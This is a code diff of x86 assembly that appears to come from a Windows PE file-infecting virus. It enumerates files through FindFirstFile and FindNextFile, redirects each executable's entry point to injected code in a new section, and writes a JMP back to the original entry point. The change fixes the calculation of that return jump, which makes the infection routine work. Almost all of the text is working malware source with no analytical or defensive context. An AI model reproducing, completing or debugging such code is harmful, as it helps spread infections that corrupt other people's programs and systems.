@@ -396,8 +396,11 @@ filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword, code
 	local originalEntryPoint:dword
 	local newSectionStart:dword
 	local virtualSectionStart:dword
-	local localdelta:dword
 	local entryInFile:dword
+	local newEntryPoint:dword
+	local jumpOffset:dword
+	local localdelta:dword
+	
 
 	local prcFindFirstFile:dword
 	local prcFindNextFile:dword
@@ -602,6 +605,7 @@ fileMainLoop:
 	add eax, [edi].SizeOfRawData ; the vadress of the end of the section
 	sub eax, ecx
 	mov [ebx].OptionalHeader.AddressOfEntryPoint, eax ; writing
+	mov newEntryPoint, eax
 
 	push esi
 	push edi
@@ -630,25 +634,22 @@ __getcur0:
 
 	mov eax, newSectionStart
 	add eax, codeSize ; go to the very end of what we copied.
+	movloc jumpOffset, newEntryPoint
+	addloc jumpOffset, codeSize
 
-	movloc entryInFile, fileView
-	addloc entryInFile, originalEntryPoint
+
 
 	sub eax, 6 ; go back 6 bytes, which is ret and 5 nops
-
-	mov esi, entryInFile
-	sub esi, eax
-	mov originalEntryPoint, esi
+	sub jumpOffset, 6
+	mov edx, originalEntryPoint
+	sub edx, jumpOffset
+	mov jumpOffset, edx
 
 	; copy the real entry point adress
 	mov byte ptr [eax], 0E9h ; E9h JMP, E8h CALL ; bug du compilo
 	inc eax
 	
-	mov esi, eax
-	add esi, 5h
-	mov ecx, originalEntryPoint
-	;;sub ecx, esi
-	mov dword ptr [eax], ecx
+	mov dword ptr [eax], edx
 	or [edi].Characteristics, IMAGE_SCN_MEM_EXECUTE
 	or [edi].Characteristics, IMAGE_SCN_MEM_WRITE
 	or [edi].Characteristics, IMAGE_SCN_MEM_READ
